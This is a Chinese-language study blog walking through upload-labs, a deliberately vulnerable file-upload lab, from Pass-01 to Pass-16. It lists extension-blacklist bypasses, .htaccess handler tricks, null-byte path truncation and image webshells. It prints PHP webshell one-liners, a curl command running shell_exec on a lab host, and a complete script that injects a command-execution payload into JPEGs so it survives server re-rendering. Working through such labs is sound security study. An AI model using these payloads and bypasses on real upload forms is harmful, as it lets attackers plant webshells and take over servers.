<p><img src="/2021/02/23/upload-labs学习笔记/image-20210118191453257.png" alt="image-20210118191453257"></p>
<p>修改，回车</p>
<p><img src="/2021/02/23/upload-labs学习笔记/image-20210118191515864.png" alt="image-20210118191515864"></p>
<p>然后上传yijuhua.php，成功</p>
<p><img src="/2021/02/23/upload-labs学习笔记/image-20210118191610025.png" alt="image-20210118191610025"></p>
<p>蚁剑连接，over</p>
<p><img src="/2021/02/23/upload-labs学习笔记/image-20210118191659280.png" alt="image-20210118191659280"></p>
<h1 id="Pass-02-后端检查Content-Type"><a href="#Pass-02-后端检查Content-Type" class="headerlink" title="Pass-02-后端检查Content-Type"></a>Pass-02-后端检查Content-Type</h1><p>php上传失败，提示文件类型不符合，盲猜是Content-type的问题</p>
<p>对比php和正常png</p>
<p><img src="/2021/02/23/upload-labs学习笔记/image-20210118192206719.png" alt="image-20210118192206719"></p>
<p>修改php包的content-type</p>
<p><img src="/2021/02/23/upload-labs学习笔记/image-20210118192438796.png" alt="image-20210118192438796"></p>
<p>看response包里的地址，../upload/yijuhua.php，上传成功了</p>
<p>看下源码，果然</p>
<p><img src="/2021/02/23/upload-labs学习笔记/image-20210118192609687.png" alt="image-20210118192609687"></p>
<h1 id="Pass-03-黑名单php3-phtml"><a href="#Pass-03-黑名单php3-phtml" class="headerlink" title="Pass-03-黑名单php3 phtml"></a>Pass-03-黑名单php3 phtml</h1><p>传php，提示：不允许上传.asp,.aspx,.php,.jsp后缀文件！</p>
<p>看来是后端黑名单，试试看改成大写PHP或者大小写混合行不行——均不行，估计是后端验证程序扩展名，而且是小写化了的</p>
<p>burp抓包.php后面加空格也不行</p>
<p>用burp爆破.php扩展名，可以试试的有</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">php3</span><br><span class="line">php5</span><br><span class="line">phtml</span><br><span class="line">phs</span><br><span class="line">pht</span><br></pre></td></tr></table></figure>
<p>php3解析成功</p>
<p><img src="/2021/02/23/upload-labs学习笔记/image-20210118194431259.png" alt="image-20210118194431259"></p>
<p>php5未解析</p>
<p><img src="/2021/02/23/upload-labs学习笔记/image-20210118194407259.png" alt="image-20210118194407259"></p>
<p>phtml解析成功</p>
<p><img src="/2021/02/23/upload-labs学习笔记/image-20210118194505255.png" alt="image-20210118194505255"></p>
<p>phs未解析</p>
<p><img src="/2021/02/23/upload-labs学习笔记/image-20210118194533715.png" alt="image-20210118194533715"></p>
<p>pht未解析</p>
<p><img src="/2021/02/23/upload-labs学习笔记/image-20210118194607217.png" alt="image-20210118194607217"></p>
<p>看博客，通常只要试试php3和phtml即可</p>
<p>看源码，还去掉了结尾空格，结尾点，扩展名大小写，::$DATA这4种绕过</p>
<p><img src="/2021/02/23/upload-labs学习笔记/image-20210118215458827.png" alt="image-20210118215458827"></p>
<p>稍等，yijuhua.php.aa可以吗</p>
<p>可以上传，但是无法解析，会取扩展名aa，然后重命名</p>
<p><img src="/2021/02/23/upload-labs学习笔记/image-20210118220008275.png" alt="image-20210118220008275"></p>
<h1 id="Pass-04-黑名单-htaccess"><a href="#Pass-04-黑名单-htaccess" class="headerlink" title="Pass-04-黑名单.htaccess"></a>Pass-04-黑名单.htaccess</h1><p>php不行，png行，估计是后端白名单</p>
<p>爆破下扩展名试试</p>
<p>搞错了，还是黑名单，把php3，phtml也屏蔽了</p>
<p>看博客说，上传一个.htaccess文件名的文件，内容为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SetHandler application/x-httpd-php</span><br></pre></td></tr></table></figure>
<p>这是个局部解析，然后就可以用图片马了，txt马也可以，都会解析为php</p>
<p><img src="/2021/02/23/upload-labs学习笔记/image-20210118235613022.png" alt="image-20210118235613022"></p>
<p>看源码，里面过滤了这么多</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;php1&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;pHp1&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;);</span><br></pre></td></tr></table></figure>
<p>并且是把扩展名小写化了，过滤了PHP等变形</p>
<p>补充，由于没有重命名，php.aa也可以</p>
<p><img src="/2021/02/23/upload-labs学习笔记/image-20210119104152778.png" alt="image-20210119104152778"></p>
<h1 id="Pass-05-黑名单大小写绕过"><a href="#Pass-05-黑名单大小写绕过" class="headerlink" title="Pass-05-黑名单大小写绕过"></a>Pass-05-黑名单大小写绕过</h1><p>.htaccess也不能传了，png，txt可以传</p>
<p>但意外的，PHP可以传了。。</p>
<p><img src="/2021/02/23/upload-labs学习笔记/image-20210119000742674.png" alt="image-20210119000742674"></p>
<p>看下源码</p>
<p><img src="/2021/02/23/upload-labs学习笔记/image-20210119095646474.png" alt="image-20210119095646474"></p>
<p>发现没有小写化，无法过滤PHP</p>
<p>上传后会重命名文件，所以.user.ini不能生效，会被随机为xxx.ini</p>
<h1 id="Pass-06-黑名单加空格"><a href="#Pass-06-黑名单加空格" class="headerlink" title="Pass-06-黑名单加空格"></a>Pass-06-黑名单加空格</h1><p>php，PHP，.htaccess不行</p>
<p>由于会重命名，.user.ini也不行，php.aa也不行</p>
<p>看04，05代码得知，遇到黑名单+重命名，还有这些方法</p>
<ul>
<li>后缀大小写</li>
<li>后缀加.</li>
<li>后缀加空格</li>
<li>后缀加::$DATA</li>
<li>（黑名单里收录的少就爆破后缀）</li>
</ul>
<p>其实都是php后缀，可以用intruder通杀一下，再加上一个.htaccess</p>
<p>发现加空格的成功了</p>
<p><img src="/2021/02/23/upload-labs学习笔记/image-20210119101933343.png" alt="image-20210119101933343"></p>
<p><img src="/2021/02/23/upload-labs学习笔记/image-20210119101839417.png" alt="image-20210119101839417"></p>
<p>看源码发现没trim空格</p>
<h1 id="Pass-07-黑名单apache解析漏洞"><a href="#Pass-07-黑名单apache解析漏洞" class="headerlink" title="Pass-07-黑名单apache解析漏洞"></a>Pass-07-黑名单apache解析漏洞</h1><p>php，PHP，htaccess不可以，txt可以，且没有重命名，想用.user.ini，能传，但没法解析，仔细看博客发现之前理解错了，首先得在这个目录下有一个php文件，才能利用.user.ini的包含把yijuhua.png包含进去</p>
<p>php加点成功</p>
<p><img src="/2021/02/23/upload-labs学习笔记/image-20210119102335689.png" alt="image-20210119102335689"></p>
<p>php.aa也可以</p>
<p><img src="/2021/02/23/upload-labs学习笔记/image-20210119103057703.png" alt="image-20210119103057703"></p>
<h1 id="Pass-08-黑名单加-DATA"><a href="#Pass-08-黑名单加-DATA" class="headerlink" title="Pass-08-黑名单加::$DATA"></a>Pass-08-黑名单加::$DATA</h1><p>php等不行，会重命名，aa也不行</p>
<p>::$DATA行，但要注意url访问时把::$DATA去掉</p>
<p><img src="/2021/02/23/upload-labs学习笔记/image-20210119104651372.png" alt="image-20210119104651372"></p>
<p>否则会出现</p>
<p><img src="/2021/02/23/upload-labs学习笔记/image-20210119104706388.png" alt="image-20210119104706388"></p>
<p>php .</p>
<h1 id="Pass-09-黑名单后缀点空点"><a href="#Pass-09-黑名单后缀点空点" class="headerlink" title="Pass-09-黑名单后缀点空点 . ."></a>Pass-09-黑名单后缀点空点 . .</h1><p>被提示误导了，以为是白名单，然后传了个txt发现还是黑名单</p>
<p>用.php. .         用.php .不行，看源码吧</p>
<p><img src="/2021/02/23/upload-labs学习笔记/image-20210119112048619.png" alt="image-20210119112048619"></p>
<p><img src="/2021/02/23/upload-labs学习笔记/image-20210119112013824.png" alt="image-20210119112013824"></p>
<p>看源码，他的思路是</p>
<ol>
<li>文件名去掉首尾空格</li>
<li>文件名去掉末尾的点</li>
<li>利用最后一个点的位置得到扩展名</li>
<li>扩展名小写，去掉扩展名里的::$DATA</li>
<li>首位去空格</li>
</ol>
<p>所以我们<code>yijuhua.php. .</code>      文件名是<code>yijuhua.php.空格</code>      扩展名是点空格</p>
<p><img src="/2021/02/23/upload-labs学习笔记/image-20210119112305021.png" alt="image-20210119112305021"></p>
<h1 id="Pass-10-双写php绕过replace"><a href="#Pass-10-双写php绕过replace" class="headerlink" title="Pass-10-双写php绕过replace"></a>Pass-10-双写php绕过replace</h1><p>传php竟然成功，然后发现变成了</p>
<p><img src="/2021/02/23/upload-labs学习笔记/image-20210119113312152.png" alt="image-20210119113312152"></p>
<p>看来是用了replace函数去掉了php</p>
<p>双写绕过，yijuhua.pphphp</p>
<p><img src="/2021/02/23/upload-labs学习笔记/image-20210119113546789.png" alt="image-20210119113546789"></p>
<p>看源码</p>
<p><img src="/2021/02/23/upload-labs学习笔记/image-20210119113820066.png" alt="image-20210119113820066"></p>
<p>其中的str_ireplace(find, replace, string, count)，会把string中的find全部替换为replace，find时不区分大小写，如果区分的话使用str_replace函数</p>
<h1 id="Pass-11-GET型-00"><a href="#Pass-11-GET型-00" class="headerlink" title="Pass-11-GET型%00"></a>Pass-11-GET型%00</h1><p>这次真的是白名单了</p>
<p>发现在url里有说法</p>
<p><img src="/2021/02/23/upload-labs学习笔记/image-20210119115054222.png" alt=""></p>
<p><img src="/2021/02/23/upload-labs学习笔记/image-20210119115223132.png" alt="image-20210119115223132"></p>
<p>看来会把文件校验后保存到save_path/file_name中去</p>
<p>那么修改一下POST的url，让他截断</p>
<p><img src="/2021/02/23/upload-labs学习笔记/image-20210119115333410.png" alt="image-20210119115333410"></p>
<p>传的后缀就用png，等会存到1.php里去</p>
<p><img src="/2021/02/23/upload-labs学习笔记/image-20210119114930204.png" alt="image-20210119114930204"></p>
<p>上传成功后发现src = /upload/1.php/xxx.png</p>
<p>直接去找php，成功</p>
<p><img src="/2021/02/23/upload-labs学习笔记/image-20210119115038626.png" alt="image-20210119115038626"></p>
<h1 id="Pass-12-POST型00截断save-path"><a href="#Pass-12-POST型00截断save-path" class="headerlink" title="Pass-12-POST型00截断save_path"></a>Pass-12-POST型00截断save_path</h1><p>还是白名单</p>
<p>发了个正常包，然后看到save_path的值会发出去为../upload/</p>
<p>那么考虑在这里hex00截断，改成../upload/3.php+，+替换成00</p>
<p>同时把filename改成png扩展名</p>
<p><img src="/2021/02/23/upload-labs学习笔记/image-20210119125853112.png" alt="image-20210119125853112"></p>
<p>成功</p>
<p><img src="/2021/02/23/upload-labs学习笔记/image-20210119130028765.png" alt="image-20210119130028765"></p>
<p>看下源码</p>
<p><img src="/2021/02/23/upload-labs学习笔记/image-20210119131508849.png" alt="image-20210119131508849"></p>
<p>file_ext根据白名单过滤剩下图片格式</p>
<p>然后通过POST里的save_path直接拼接出保存路径，重命名</p>
<p>move_uploaded_file的底层对于字符串会在00的位置截断</p>
<h1 id="Pass-13-图片马检查magic-number"><a href="#Pass-13-图片马检查magic-number" class="headerlink" title="Pass-13-图片马检查magic number"></a>Pass-13-图片马检查magic number</h1><p>要求传图片马，并且可以被文件包含漏洞利用</p>
<p>copy命令即可，然后自己复制个include.php去upload目录，包含一下完事</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">test pic trojan</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">header(<span class="string">"Content-Type:text/html;charset=utf-8"</span>);</span><br><span class="line">$file = $_GET[<span class="string">'file'</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($file))&#123;</span><br><span class="line">    <span class="keyword">include</span> $file;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    show_source(<span class="keyword">__file__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>完事</p>
<p><img src="/2021/02/23/upload-labs学习笔记/image-20210119133721078.png" alt="image-20210119133721078"></p>
<p>看下源码</p>
<p><img src="/2021/02/23/upload-labs学习笔记/image-20210119134937759.png" alt="image-20210119134937759"></p>
<p>就检查头2个字节</p>
<p><img src="/2021/02/23/upload-labs学习笔记/image-20210119134957746.png" alt="image-20210119134957746"></p>
<p>然后根据类型重新设置文件扩展名</p>
<h1 id="Pass-14-图片马getimagesize-gt-0"><a href="#Pass-14-图片马getimagesize-gt-0" class="headerlink" title="Pass-14-图片马getimagesize&gt;=0"></a>Pass-14-图片马getimagesize&gt;=0</h1><p>copy一样ok</p>
<p>看下源码</p>
<p><img src="/2021/02/23/upload-labs学习笔记/image-20210119135133855.png" alt="image-20210119135133855"></p>
<p><img src="/2021/02/23/upload-labs学习笔记/image-20210119135730085.png" alt="image-20210119135730085"></p>
<p>用了file_exists函数检查文件是否存在？（防止burp改名？）</p>
<p>然后获取扩展名，判断jpeg，gif，png是否存在于扩展名中</p>
<p>存在就上传</p>
<h1 id="Pass-15-类型检查exif-imagetype"><a href="#Pass-15-类型检查exif-imagetype" class="headerlink" title="Pass-15-类型检查exif_imagetype"></a>Pass-15-类型检查exif_imagetype</h1><p>同13</p>
<p>copy即可</p>
<p>看源码</p>
<p><img src="/2021/02/23/upload-labs学习笔记/image-20210119140104890.png" alt="image-20210119140104890"></p>
<p>用了exif_imagetype函数</p>
<p><img src="/2021/02/23/upload-labs学习笔记/image-20210119140220038.png" alt="image-20210119140220038"></p>
<p>isImage返回类型字符串，拼接重命名上传</p>
<h1 id="Pass-16-二次渲染"><a href="#Pass-16-二次渲染" class="headerlink" title="Pass-16-二次渲染"></a>Pass-16-二次渲染</h1><p>提示是二次渲染</p>
<h2 id="gif"><a href="#gif" class="headerlink" title="gif"></a>gif</h2><p>传个gif图片马，发现连不上，下载回来一看末尾添加的一句话已经被删了，文件大小也缩了很多</p>
<p>尝试往不变的地方添加一句话，发现还是开头处有一串点，那里可以替换为一句话</p>
<p><img src="/2021/02/23/upload-labs学习笔记/image-20210119165443656.png" alt="image-20210119165443656"></p>
<p>上传后下回来，发现ok了没被删</p>
<p><img src="/2021/02/23/upload-labs学习笔记/image-20210119165508627.png" alt="image-20210119165508627"></p>
<h2 id="png"><a href="#png" class="headerlink" title="png"></a>png</h2><p>一个现成的png，原理是IDAT，内容是</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?=$_GET[0]($_POST[1]);?&gt;</span><br></pre></td></tr></table></figure>
<p>图片如下</p>
<p><img src="/2021/02/23/upload-labs学习笔记/get-0-post-1.png" alt="get-0-post-1"></p>
<p>用的办法比较复杂，需要使用这条命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl -i -X POST &quot;http://192.168.189.128/upload/include.php?file=18200.png&amp;0=shell_exec&quot; -d &quot;1=dir&quot; --output cc.txt</span><br></pre></td></tr></table></figure>
<p>解释一下，就是向目标<code>http://192.168.189.128/upload/include.php?file=18200.png</code>，把目标当成php包含，然后传递GET[0]=shell_exec，POST[1]=dir这两个参数，结果保存到本地cc.txt中</p>
<p><img src="/2021/02/23/upload-labs学习笔记/image-20210120223241806.png" alt="image-20210120223241806"></p>
<hr>
<p>另一个原理是PLTE，内容是phpinfo</p>
<p>不知道怎么改</p>
<p>相关文章</p>
<p><a href="https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/" target="_blank" rel="noopener">https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/</a></p>
<p><a href="https://www.cnblogs.com/forforever/p/13191999.html" target="_blank" rel="noopener">https://www.cnblogs.com/forforever/p/13191999.html</a></p>
<p><a href="https://xz.aliyun.com/t/2657#toc-13" target="_blank" rel="noopener">https://xz.aliyun.com/t/2657#toc-13</a></p>
<p>文件上传的配合</p>
<p><img src="/2021/02/23/upload-labs学习笔记/20190705134326-cf982650-9ee7-1.jpg" alt="img"></p>
<h2 id="jpg-jpeg"><a href="#jpg-jpeg" class="headerlink" title="jpg/jpeg"></a>jpg/jpeg</h2><p>有国外大牛脚本，但不是都能插入成功，甚至被判定不是jpg文件格式，需要尝试不少图片，这个图是成功率比较高的，但payload不能随便改</p>
<p>这个地址上的payload_1.jpg可以过二次渲染，并且触发phpinfo</p>
<p><a href="https://github.com/99gg/jpg_payload_back" target="_blank" rel="noopener">https://github.com/99gg/jpg_payload_back</a></p>
<p><img src="/2021/02/23/upload-labs学习笔记/payload_1-phpinfo.jpg" alt="payload_1"></p>
<p>效果如下</p>
<p><img src="/2021/02/23/upload-labs学习笔记/image-20210121210722166.png" alt="image-20210121210722166"></p>
<p>用这个地址上的脚本，针对上传一次后的月球图片，可以成功</p>
<p><a href="https://github.com/BlackFan/jpg_payload/blob/master/jpg_payload.php" target="_blank" rel="noopener">https://github.com/BlackFan/jpg_payload/blob/master/jpg_payload.php</a></p>
<p>原图片为</p>
<p><img src="/2021/02/23/upload-labs学习笔记/1.jpg" alt="1"></p>
<p>但这个图片不能直接改，否则上传时会报不是jpg</p>
<p>先传一下1.jpg，得到下面这个图片（文件缩小了）</p>
<p><img src="/2021/02/23/upload-labs学习笔记/1-upload.jpg" alt="1-upload"></p>
<p>然后再运行脚本，脚本内容为</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	The algorithm of injecting the payload into the JPG image, which will keep unchanged after transformations</span></span><br><span class="line"><span class="comment">	caused by PHP functions imagecopyresized() and imagecopyresampled().</span></span><br><span class="line"><span class="comment">	It is necessary that the size and quality of the initial image are the same as those of the processed</span></span><br><span class="line"><span class="comment">	image.</span></span><br><span class="line"><span class="comment">	1) Upload an arbitrary image via secured files upload script</span></span><br><span class="line"><span class="comment">	2) Save the processed image and launch:</span></span><br><span class="line"><span class="comment">	php jpg_payload.php &lt;jpg_name.jpg&gt;</span></span><br><span class="line"><span class="comment">	In case of successful injection you will get a specially crafted image, which should be uploaded again.</span></span><br><span class="line"><span class="comment">	Since the most straightforward injection method is used, the following problems can occur:</span></span><br><span class="line"><span class="comment">	1) After the second processing the injected data may become partially corrupted.</span></span><br><span class="line"><span class="comment">	2) The jpg_payload.php script outputs "Something's wrong".</span></span><br><span class="line"><span class="comment">	If this happens, try to change the payload (e.g. add some symbols at the beginning) or try another </span></span><br><span class="line"><span class="comment">	initial image.</span></span><br><span class="line"><span class="comment">	Sergey Bobrov <span class="doctag">@Black</span>2Fan.</span></span><br><span class="line"><span class="comment">	See also:</span></span><br><span class="line"><span class="comment">	https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line"></span><br><span class="line">	$miniPayload = <span class="string">'&lt;?=system($_GET[c]);?&gt;'</span>;</span><br><span class="line">	<span class="comment">/*$miniPayload = '&lt;?=`$_POST[c]`?&gt;';*/</span></span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span>(!extension_loaded(<span class="string">'gd'</span>) || !function_exists(<span class="string">'imagecreatefromjpeg'</span>)) &#123;</span><br><span class="line">    	<span class="keyword">die</span>(<span class="string">'php-gd is not installed'</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span>(!<span class="keyword">isset</span>($argv[<span class="number">1</span>])) &#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">'php jpg_payload.php &lt;jpg_name.jpg&gt;'</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	set_error_handler(<span class="string">"custom_error_handler"</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span>($pad = <span class="number">0</span>; $pad &lt; <span class="number">1024</span>; $pad++) &#123;</span><br><span class="line">		$nullbytePayloadSize = $pad;</span><br><span class="line">		$dis = <span class="keyword">new</span> DataInputStream($argv[<span class="number">1</span>]);</span><br><span class="line">		$outStream = file_get_contents($argv[<span class="number">1</span>]);</span><br><span class="line">		$extraBytes = <span class="number">0</span>;</span><br><span class="line">		$correctImage = <span class="keyword">TRUE</span>;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>($dis-&gt;readShort() != <span class="number">0xFFD8</span>) &#123;</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">'Incorrect SOI marker'</span>);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">while</span>((!$dis-&gt;eof()) &amp;&amp; ($dis-&gt;readByte() == <span class="number">0xFF</span>)) &#123;</span><br><span class="line">			$marker = $dis-&gt;readByte();</span><br><span class="line">			$size = $dis-&gt;readShort() - <span class="number">2</span>;</span><br><span class="line">			$dis-&gt;skip($size);</span><br><span class="line">			<span class="keyword">if</span>($marker === <span class="number">0xDA</span>) &#123;</span><br><span class="line">				$startPos = $dis-&gt;seek();</span><br><span class="line">				$outStreamTmp = </span><br><span class="line">					substr($outStream, <span class="number">0</span>, $startPos) . </span><br><span class="line">					$miniPayload . </span><br><span class="line">					str_repeat(<span class="string">"\0"</span>,$nullbytePayloadSize) . </span><br><span class="line">					substr($outStream, $startPos);</span><br><span class="line">				checkImage(<span class="string">'_'</span>.$argv[<span class="number">1</span>], $outStreamTmp, <span class="keyword">TRUE</span>);</span><br><span class="line">				<span class="keyword">if</span>($extraBytes !== <span class="number">0</span>) &#123;</span><br><span class="line">					<span class="keyword">while</span>((!$dis-&gt;eof())) &#123;</span><br><span class="line">						<span class="keyword">if</span>($dis-&gt;readByte() === <span class="number">0xFF</span>) &#123;</span><br><span class="line">							<span class="keyword">if</span>($dis-&gt;readByte !== <span class="number">0x00</span>) &#123;</span><br><span class="line">								<span class="keyword">break</span>;</span><br><span class="line">							&#125;</span><br><span class="line">						&#125;</span><br><span class="line">					&#125;</span><br><span class="line">					$stopPos = $dis-&gt;seek() - <span class="number">2</span>;</span><br><span class="line">					$imageStreamSize = $stopPos - $startPos;</span><br><span class="line">					$outStream = </span><br><span class="line">						substr($outStream, <span class="number">0</span>, $startPos) . </span><br><span class="line">						$miniPayload . </span><br><span class="line">						substr(</span><br><span class="line">							str_repeat(<span class="string">"\0"</span>,$nullbytePayloadSize).</span><br><span class="line">								substr($outStream, $startPos, $imageStreamSize),</span><br><span class="line">							<span class="number">0</span>,</span><br><span class="line">							$nullbytePayloadSize+$imageStreamSize-$extraBytes) . </span><br><span class="line">								substr($outStream, $stopPos);</span><br><span class="line">				&#125; <span class="keyword">elseif</span>($correctImage) &#123;</span><br><span class="line">					$outStream = $outStreamTmp;</span><br><span class="line">				&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">					<span class="keyword">break</span>;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">if</span>(checkImage(<span class="string">'payload_'</span>.$argv[<span class="number">1</span>], $outStream)) &#123;</span><br><span class="line">					<span class="keyword">die</span>(<span class="string">'Success!'</span>);</span><br><span class="line">				&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">					<span class="keyword">break</span>;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	unlink(<span class="string">'payload_'</span>.$argv[<span class="number">1</span>]);</span><br><span class="line">	<span class="keyword">die</span>(<span class="string">'Something\'s wrong'</span>);</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">checkImage</span><span class="params">($filename, $data, $unlink = FALSE)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">global</span> $correctImage;</span><br><span class="line">		file_put_contents($filename, $data);</span><br><span class="line">		$correctImage = <span class="keyword">TRUE</span>;</span><br><span class="line">		imagecreatefromjpeg($filename);</span><br><span class="line">		<span class="keyword">if</span>($unlink)</span><br><span class="line">			unlink($filename);</span><br><span class="line">		<span class="keyword">return</span> $correctImage;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">custom_error_handler</span><span class="params">($errno, $errstr, $errfile, $errline)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">global</span> $extraBytes, $correctImage;</span><br><span class="line">		$correctImage = <span class="keyword">FALSE</span>;</span><br><span class="line">		<span class="keyword">if</span>(preg_match(<span class="string">'/(\d+) extraneous bytes before marker/'</span>, $errstr, $m)) &#123;</span><br><span class="line">			<span class="keyword">if</span>(<span class="keyword">isset</span>($m[<span class="number">1</span>])) &#123;</span><br><span class="line">				$extraBytes = (int)$m[<span class="number">1</span>];</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">DataInputStream</span> </span>&#123;</span><br><span class="line">		<span class="keyword">private</span> $binData;</span><br><span class="line">		<span class="keyword">private</span> $order;</span><br><span class="line">		<span class="keyword">private</span> $size;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($filename, $order = false, $fromString = false)</span> </span>&#123;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;binData = <span class="string">''</span>;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;order = $order;</span><br><span class="line">			<span class="keyword">if</span>(!$fromString) &#123;</span><br><span class="line">				<span class="keyword">if</span>(!file_exists($filename) || !is_file($filename))</span><br><span class="line">					<span class="keyword">die</span>(<span class="string">'File not exists ['</span>.$filename.<span class="string">']'</span>);</span><br><span class="line">				<span class="keyword">$this</span>-&gt;binData = file_get_contents($filename);</span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">				<span class="keyword">$this</span>-&gt;binData = $filename;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;size = strlen(<span class="keyword">$this</span>-&gt;binData);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">seek</span><span class="params">()</span> </span>&#123;</span><br><span class="line">			<span class="keyword">return</span> (<span class="keyword">$this</span>-&gt;size - strlen(<span class="keyword">$this</span>-&gt;binData));</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">skip</span><span class="params">($skip)</span> </span>&#123;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;binData = substr(<span class="keyword">$this</span>-&gt;binData, $skip);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">readByte</span><span class="params">()</span> </span>&#123;</span><br><span class="line">			<span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;eof()) &#123;</span><br><span class="line">				<span class="keyword">die</span>(<span class="string">'End Of File'</span>);</span><br><span class="line">			&#125;</span><br><span class="line">			$byte = substr(<span class="keyword">$this</span>-&gt;binData, <span class="number">0</span>, <span class="number">1</span>);</span><br><span class="line">			<span class="keyword">$this</span>-&gt;binData = substr(<span class="keyword">$this</span>-&gt;binData, <span class="number">1</span>);</span><br><span class="line">			<span class="keyword">return</span> ord($byte);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">readShort</span><span class="params">()</span> </span>&#123;</span><br><span class="line">			<span class="keyword">if</span>(strlen(<span class="keyword">$this</span>-&gt;binData) &lt; <span class="number">2</span>) &#123;</span><br><span class="line">				<span class="keyword">die</span>(<span class="string">'End Of File'</span>);</span><br><span class="line">			&#125;</span><br><span class="line">			$short = substr(<span class="keyword">$this</span>-&gt;binData, <span class="number">0</span>, <span class="number">2</span>);</span><br><span class="line">			<span class="keyword">$this</span>-&gt;binData = substr(<span class="keyword">$this</span>-&gt;binData, <span class="number">2</span>);</span><br><span class="line">			<span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;order) &#123;</span><br><span class="line">				$short = (ord($short[<span class="number">1</span>]) &lt;&lt; <span class="number">8</span>) + ord($short[<span class="number">0</span>]);</span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">				$short = (ord($short[<span class="number">0</span>]) &lt;&lt; <span class="number">8</span>) + ord($short[<span class="number">1</span>]);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">return</span> $short;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">eof</span><span class="params">()</span> </span>&#123;</span><br><span class="line">			<span class="keyword">return</span> !<span class="keyword">$this</span>-&gt;binData||(strlen(<span class="keyword">$this</span>-&gt;binData) === <span class="number">0</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>下面这个图片可以过二次渲染，内容是system($_GET[c])</p>
